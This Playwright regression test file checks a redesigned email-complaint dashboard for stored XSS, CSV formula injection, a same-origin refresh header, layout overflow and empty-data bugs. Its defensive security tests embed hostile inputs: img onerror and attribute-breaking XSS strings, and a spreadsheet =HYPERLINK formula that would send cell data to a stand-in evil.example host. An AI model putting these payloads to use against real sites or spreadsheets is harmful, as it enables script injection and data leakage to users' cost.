// SPDX-License-Identifier: MIT | Copyright (c) 2026 Yoni Ryabinski
import fs from 'node:fs';
import { test, expect } from '@playwright/test';

// Regression tests for defects found in QA of the redesigned dashboard:
// stored XSS through table cells and attributes, CSV formula injection, the
// same-origin refresh header, page/region horizontal scrolling with long names
// or narrow screens, and NaN text when there is no complaint history.

async function fetchModel(request) {
  const res = await request.get('/api/report');
  expect(res.ok()).toBeTruthy();
  return res.json();
}

const XSS = '<img src=x onerror="window.__pwned=(window.__pwned||0)+1">';
const ATTR_XSS = 'x" onfocus="window.__pwned=(window.__pwned||0)+1" autofocus tabindex="0" data-a="';

function hostile(model) {
  const m = structuredClone(model);
  m.complainants = m.complainants.map((c) => ({ ...c, email: `"${XSS}"@evil.test`, arf_provider: XSS, auth_provider: XSS, recorded_at: XSS }));
  m.unattributed = [{ domain: XSS, feedback_type: XSS, events: 1 }];
  m.config_sets = m.config_sets.map((c) => ({ ...c, name: c.name + XSS, event_types: [...c.event_types, XSS] }));
  m.sns_topics = m.sns_topics.map((t) => ({ ...t, name: XSS }));
  m.identity_feedback = m.identity_feedback.map((r) => ({ ...r, identity: XSS }));
  m.identities = { ...m.identities, rows: m.identities.rows.map((r) => ({ ...r, name: XSS, type: XSS })) };
  m.config_set_complaints = m.config_set_complaints.map((c) => ({ ...c, config_set: ATTR_XSS }));
  m.metrics = { ...m.metrics, complaints_by_day: m.metrics.complaints_by_day.map((d, i) => (i ? d : { ...d, date: d.date })) };
  return m;
}

test('API-supplied strings are rendered as text, never as markup', async ({ page, request }) => {
  const model = hostile(await fetchModel(request));
  await page.route('**/api/report', (r) => r.fulfill({ json: model }));
  await page.goto('/');
  await expect(page.locator('#complainantTable tbody tr').first()).toBeVisible();
  await page.locator('#coverage ~ * details.more, section:has(#coverage) details.more').first().evaluate((d) => { d.open = true; });
  await page.locator('#attribution ~ * .hbar, section:has(#attribution) .hbar').first().focus().catch(() => {});
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__pwned || 0)).toBe(0);
  expect(await page.locator('#app img').count()).toBe(0);
  await expect(page.locator('#complainantTable tbody')).toContainText('onerror');
});

test('CSV export neutralises spreadsheet formulas', async ({ page, request }) => {
  const model = await fetchModel(request);
  model.complaint_records = [{ ...model.complaint_records[0], email: '=HYPERLINK("http://evil.example/?"&A2,"x")', detail: '+SUM(1,1)', source: '@cmd' }];
  await page.route('**/api/report', (r) => r.fulfill({ json: model }));
  await page.goto('/');
  await expect(page.locator('#recordTable tbody tr').first()).toBeVisible();
  const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('#recordTable button.ghost.mini:not(.selsort)').click()]);
  const csv = fs.readFileSync(await dl.path(), 'utf8');
  const cells = csv.split('\n')[1];
  expect(cells).not.toMatch(/(^|,)"?[=+@-]/);
  expect(cells).toContain("'=HYPERLINK");
});

test('Refresh sends the same-origin header the server requires', async ({ page }) => {
  await page.goto('/');
  await expect(page.locator('#overview')).toBeVisible();
  const [req] = await Promise.all([page.waitForRequest((r) => r.url().endsWith('/api/refresh') && r.method() === 'POST'), page.click('#refresh')]);
  expect(req.headers()['x-requested-with']).toBe('sesreport');
  await expect(page.locator('#refresh')).toBeEnabled({ timeout: 15000 });
  await expect(page.locator('#toast')).not.toContainText('failed');
});

for (const width of [320, 390, 760, 1024, 1440]) {
  test(`nothing scrolls sideways at ${width}px, even with long unbreakable names`, async ({ page, request }) => {
    const model = await fetchModel(request);
    const long = 'Xk'.repeat(40);
    model.config_sets = Array.from({ length: 8 }, (_, i) => ({ name: `cs-${i}-${long}`, event_types: i % 2 ? ['BOUNCE', 'COMPLAINT', 'DELIVERY', 'OPEN', 'CLICK', 'SEND', 'REJECT'] : [], destinations: [], forwards_feedback: !!(i % 2) }));
    model.suppression_coverage = model.config_sets.map((c) => ({ config_set: c.name, routes_feedback: c.forwards_feedback, event_types: c.event_types, destinations: 0, sends: 12345, complaints: 1, risk: c.forwards_feedback ? 'ok' : 'high' }));
    model.config_set_complaints = model.config_sets.slice(0, 3).map((c) => ({ config_set: c.name, events: 1, days: [{ date: model.metrics.complaints_by_day[0].date, count: 1 }] }));
    model.complainants = model.complainants.map((c) => ({ ...c, email: `${long}@${long}.example.com`, arf_provider: long }));
    await page.setViewportSize({ width, height: 900 });
    await page.route('**/api/report', (r) => r.fulfill({ json: model }));
    await page.goto('/');
    await expect(page.locator('#recordTable tbody tr').first()).toBeVisible();
    await page.evaluate(() => document.querySelectorAll('details').forEach((d) => { d.open = true; }));
    await page.waitForTimeout(300);
    const offenders = await page.evaluate(() => {
      const out = [];
      if (document.documentElement.scrollWidth > innerWidth) out.push(`page ${document.documentElement.scrollWidth}`);
      for (const e of document.querySelectorAll('#app *, #secnav')) {
        const cs = getComputedStyle(e);
        if (/(auto|scroll)/.test(cs.overflowX) && e.scrollWidth > e.clientWidth + 1) out.push(`${e.tagName}.${e.className} ${e.scrollWidth}>${e.clientWidth}`);
      }
      return out;
    });
    expect(offenders).toEqual([]);
  });
}

test('no NaN or undefined text when there is no complaint history', async ({ page, request }) => {
  const model = await fetchModel(request);
  Object.assign(model.metrics, { complaints_by_day: [], rate_series: [], total_complaints: 0, overall_complaint_rate: 0, peak_rate: null, latest_rate: null });
  model.retention = { cloudwatch_days: 455, oldest_expires: null, newest_expires: null };
  model.config_set_complaints = [];
  await page.route('**/api/report', (r) => r.fulfill({ json: model }));
  await page.goto('/');
  await expect(page.locator('#overview')).toBeVisible();
  expect(await page.textContent('#app')).not.toMatch(/\bNaN\b|undefined|Invalid Date/);
});

// The nav attention badge is small bold text: it must clear WCAG AA (4.5:1) in both themes.
for (const scheme of ['light', 'dark']) {
  test(`nav attention badge has AA contrast in ${scheme}`, async ({ browser }) => {
    const ctx = await browser.newContext({ colorScheme: scheme, reducedMotion: 'reduce' });
    const page = await ctx.newPage();
    await page.goto('/');
    const badge = page.locator('#secnav .alertcount');
    await expect(badge).toBeVisible();
    const ratio = await badge.evaluate((el) => {
      const rgb = (c) => c.match(/[\d.]+/g).slice(0, 4).map(Number);
      const lum = ([r, g, b]) => [r, g, b].map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; })
        .reduce((a, v, i) => a + v * [0.2126, 0.7152, 0.0722][i], 0);
      const fg = rgb(getComputedStyle(el).color);
      const bg = rgb(getComputedStyle(el).backgroundColor);
      if (bg.length === 4 && bg[3] < 1) return 0; // translucent badge: contrast depends on what is behind it
      const [a, b] = [lum(fg), lum(bg)].sort((x, y) => y - x);
      return (a + 0.05) / (b + 0.05);
    });
    expect(ratio).toBeGreaterThanOrEqual(4.5);
    await ctx.close();
  });
}
